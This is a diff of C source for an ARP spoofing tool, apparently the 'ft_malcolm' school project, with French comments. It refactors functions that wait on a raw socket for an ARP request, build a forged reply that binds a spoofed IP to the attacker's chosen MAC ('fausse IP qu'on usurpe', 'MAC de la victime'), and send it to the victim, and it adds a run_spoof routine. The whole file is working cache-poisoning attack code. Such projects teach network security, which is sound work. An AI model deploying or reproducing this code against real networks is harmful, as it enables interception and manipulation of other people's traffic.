@@ -1,29 +1,24 @@
 #include "ft_malcolm.h"
 
-
-int receive_arp(int sockfd, uint8_t *buffer, uint8_t *source_ip_converted)
+// Attend et filtre les paquets ARP jusqu'à recevoir une requête pour source_ip
+int receive_arp(int sockfd, uint8_t *buffer, uint8_t *source_ip)
 {
+	struct arp_packet *arp = (struct arp_packet *)(buffer + ETH_HEADER_SIZE);
+
 	while (1)
 	{
-		if (recvfrom(sockfd, buffer, 1024, 0, NULL, NULL) < 0) 	// syscall bloquant, process en sleeping dans kernel : maj renvoit copie des recu en buffer.       taille maxa lire, pas de flag,  pas de source pour savoir qui a send, pas  de taille de la source.
+		// syscall bloquant : le process dort dans le kernel jusqu'à réception d'un paquet
+		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0)
 		{
 			perror("recvfrom");
 			return 0;
 		}
-		printf("bytes 20-21 (opcode): %02x %02x\n", buffer[20], buffer[21]);
-		printf("bytes 24-27 (src_ip): %d.%d.%d.%d\n", buffer[28], buffer[29], buffer[30], buffer[31]);
-		printf("bytes 38-41 (dst_ip): %d.%d.%d.%d\n", buffer[38], buffer[39], buffer[40], buffer[41]);
-
-		// struct ethernet_header *eth = (struct ethernet_header *)buffer;  // on prent les 14 premier octet du buffer et ils vont dans la structure (contigue d octet une structure en realite)
-		struct arp_packet *arp = (struct arp_packet *)(buffer + 14); // les restat dans la partie tram arp
-
-		// recup le opcode et verif si on a bien recu le mec qu on target
 		if (ntohs(arp->opcode) != 1)
 		{
 			printf("not an ARP request, ignoring\n");
 			continue;
 		}
-		if (memcmp(arp->dst_ip, source_ip_converted, 4) != 0)
+		if (memcmp(arp->dst_ip, source_ip, 4) != 0)
 		{
 			printf("ARP request is not for our IP, ignoring\n");
 			continue;
@@ -32,47 +27,56 @@ int receive_arp(int sockfd, uint8_t *buffer, uint8_t *source_ip_converted)
 	}
 }
 
-void build_reply(uint8_t *reply, uint8_t *target_mac_converted, uint8_t *source_mac_converted, uint8_t *source_ip_converted, uint8_t *target_ip_converted)
+// construire la fausse réponse
+void build_reply(uint8_t *reply, t_addrs *addrs)
 {
-	// construire la fausse reponse 
-	memset(reply, 0, 42);
-
-	struct ethernet_header *reply_eth = (struct ethernet_header *)reply;
-	struct arp_packet      *reply_arp = (struct arp_packet *)(reply + 14);
+	memset(reply, 0, ARP_FRAME_SIZE);
 
 	// ethernet header
-	memcpy(reply_eth->dst_mac,  target_mac_converted, 6);  // on envoie à la victime
-	memcpy(reply_eth->src_mac,  source_mac_converted, 6);  // on se fait passer pour source
-	reply_eth->ethertype = htons(ETH_P_ARP);
+	struct ethernet_header *eth = (struct ethernet_header *)reply;
+	memcpy(eth->dst_mac, addrs->target_mac, 6);  // on envoie à la victime
+	memcpy(eth->src_mac, addrs->source_mac, 6);  // on se fait passer pour source
+	eth->ethertype = htons(ETH_P_ARP);
 
 	// arp reply
-	reply_arp->hw_type    = htons(1);       // ethernet
-	reply_arp->proto_type = htons(0x0800);  // IPv4
-	reply_arp->hw_size    = 6;              // taille MAC
-	reply_arp->proto_size = 4;              // taille IP
-	reply_arp->opcode     = htons(2);       // 2 = reply
-
-	memcpy(reply_arp->src_mac, source_mac_converted, 6);  // fausse MAC qu'on annonce
-	memcpy(reply_arp->src_ip,  source_ip_converted,  4);  // fausse IP qu'on usurpe
-	memcpy(reply_arp->dst_mac, target_mac_converted, 6);  // MAC de la victime
-	memcpy(reply_arp->dst_ip,  target_ip_converted,  4);  // IP de la victime
+	struct arp_packet *arp = (struct arp_packet *)(reply + ETH_HEADER_SIZE);
+	arp->hw_type    = htons(1);       // ethernet
+	arp->proto_type = htons(0x0800);  // IPv4
+	arp->hw_size    = 6;              // taille MAC
+	arp->proto_size = 4;              // taille IP
+	arp->opcode     = htons(2);       // 2 = reply
+	memcpy(arp->src_mac, addrs->source_mac, 6);  // fausse MAC qu'on annonce
+	memcpy(arp->src_ip,  addrs->source_ip,  4);  // fausse IP qu'on usurpe
+	memcpy(arp->dst_mac, addrs->target_mac, 6);  // MAC de la victime
+	memcpy(arp->dst_ip,  addrs->target_ip,  4);  // IP de la victime
 }
 
-int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac_converted, int ifindex)
+int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int ifindex)
 {
-	// renvoit la reply 
+	// renvoit la reply
 	struct sockaddr_ll dest;
 	memset(&dest, 0, sizeof(dest));
 	dest.sll_ifindex = ifindex;
 	dest.sll_family  = AF_PACKET;
 	dest.sll_halen   = 6;
-	memcpy(dest.sll_addr, target_mac_converted, 6);
+	memcpy(dest.sll_addr, target_mac, 6);
 
-	if (sendto(sockfd, reply, 42, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
+	if (sendto(sockfd, reply, ARP_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
 	{
 		perror("sendto");
 		return 0;
 	}
 	printf("ARP reply sent\n");
 	return 1;
+}
+
+int run_spoof(t_addrs *addrs, int ifindex, uint8_t *buffer)
+{
+	if (!receive_arp(g_sockfd, buffer, addrs->source_ip))
+		return 0;
+	printf("got a valid ARP request, sending reply...\n");
+
+	uint8_t reply[ARP_FRAME_SIZE];
+	build_reply(reply, addrs);
+	return send_reply(g_sockfd, reply, addrs->target_mac, ifindex);
 }
